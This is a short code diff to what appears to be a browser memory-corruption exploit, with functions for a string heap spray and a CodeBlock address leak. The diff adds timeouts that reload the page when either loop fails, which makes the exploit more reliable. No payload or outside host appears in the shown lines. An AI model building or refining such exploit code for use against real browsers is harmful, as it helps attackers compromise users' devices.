@@ -428,6 +428,12 @@ async function make_rdr(view) {
         gc();
         await sleep();
         str_wait++;
+
+        if (str_wait > 128) {
+            log('String spray timed out, reloading...');
+            location.reload();
+            return;
+        }
     }
     log(`JSString reused memory at loop: ${str_wait}`);
 
@@ -573,6 +579,12 @@ async function leak_code_block(reader, bt_size) {
         find_cb_loop++;
         gc();
         await sleep();
+
+        if (find_cb_loop > 16) {
+            log('CodeBlock leak timed out, reloading...');
+            location.reload();
+            return;
+        }
     }
     log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
     log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
